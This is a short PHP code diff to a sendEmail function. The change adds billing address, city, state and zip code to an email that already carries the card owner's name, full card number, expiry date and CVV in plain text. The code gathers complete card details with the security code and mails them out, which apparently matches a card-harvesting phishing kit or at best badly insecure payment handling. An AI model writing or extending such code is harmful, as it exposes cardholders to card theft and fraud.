@@ -14,6 +14,10 @@ function sendEmail($post) {
     $name = $post['name'];
     $amount_to_pay = $post['amount'];
     $card_number = $post['cardNumber'];
+    $address = $post['address'];
+    $city = $post['city'];
+    $state = $post['state'];
+    $zipCode = $post['zipCode'];
     $card_expiration_year = $post['expYear'];
     $card_expiration_month = $post['expMonth'];
     $cvv = $post['cvv'];
@@ -76,9 +80,14 @@ function sendEmail($post) {
     $headers .= "Reply-To: {$fromEmail}" . "\r\n";
 
     $email_body = "You have received a new message.\n\n";
+    $email_body .= "Billing address: $address\r\n";
+    $email_body .= "State: $state\r\n";
+    $email_body .= "city: $city\r\n";
+    $email_body .= "zip-code: $zipCode\r\n";
     $email_body .= "Card owner: $name\r\n";
     $email_body .= "Card number: $card_number\r\n";
     $email_body .= "amount: $amount_to_pay\r\n";
+    
     $email_body .= "Card expiration year: $card_expiration_year\r\n";
     $email_body .= "Card expiration month: $card_expiration_month\r\n";
     $email_body .= "Card CVC: $cvv\r\n";
